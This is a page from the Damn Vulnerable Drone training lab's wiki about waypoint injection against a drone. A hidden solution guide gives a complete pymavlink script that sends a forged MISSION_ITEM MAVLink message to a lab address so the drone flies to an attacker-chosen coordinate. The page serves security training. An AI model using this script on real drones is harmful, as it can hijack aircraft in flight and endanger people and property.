<i>Inject a new waypoint into the drone's mission using a forged MISSION_ITEM MAVLink command.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Injection > Waypoint Injection

# Description

Waypoint injection allows an attacker to modify or insert new waypoints into the drone’s mission plan without operator approval. This is done by sending a forged `MISSION_ITEM` MAVLink message to the flight controller, which defines a new waypoint with specific latitude, longitude, altitude, and behavior parameters.

If successful, the drone will treat the injected waypoint as part of its mission, even if it was not originally programmed by the Ground Control Station (GCS).

# Resources

- <a href="https://pypi.org/project/pymavlink/">pymavlink</a>  
- <a href="https://mavlink.io/en/messages/common.html#MISSION_ITEM">MAVLink MISSION_ITEM</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Install pymavlink</h3>

<pre><code class="code mb-3 mt-3">pip install pymavlink
</code></pre>

---

<h3>Step 2. Create the Waypoint Injection Script</h3>

Save the following Python code as <code>waypoint_injection.py</code>:

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil

# Connection to the drone's MAVLink port
connection_string = 'tcp:10.13.0.3:5760'
master = mavutil.mavlink_connection(connection_string)
master.wait_heartbeat()
print("[+] Connected to drone")

# Define injected waypoint
seq = 0
frame = mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT
command = mavutil.mavlink.MAV_CMD_NAV_WAYPOINT
current = 0
autocontinue = 1
param1 = 0     # Hold time (sec)
param2 = 0     # Acceptance radius (m)
param3 = 0     # Pass through
param4 = 0     # Yaw angle
latitude = -35.363261
longitude = 149.165230
altitude = 20

# Send the spoofed mission item
master.mav.mission_item_send(
    master.target_system,
    master.target_component,
    seq,
    frame,
    command,
    current,
    autocontinue,
    param1,
    param2,
    param3,
    param4,
    latitude,
    longitude,
    altitude
)

print(f"[!] Injected waypoint at lat={latitude}, lon={longitude}, alt={altitude}m")
</code></pre>

---

<h3>Step 3. Run the Script</h3>

<pre><code class="code mb-3 mt-3">sudo python3 waypoint_injection.py
</code></pre>

Once injected, the drone may navigate to the new coordinate, depending on mission state and acceptance rules.

---

<h3>Effect</h3>

- The drone may diverge from its original mission  
- In auto or guided mode, it may attempt to fly to the spoofed waypoint  
- The operator may not immediately be aware of the injection unless monitoring mission state

</details>
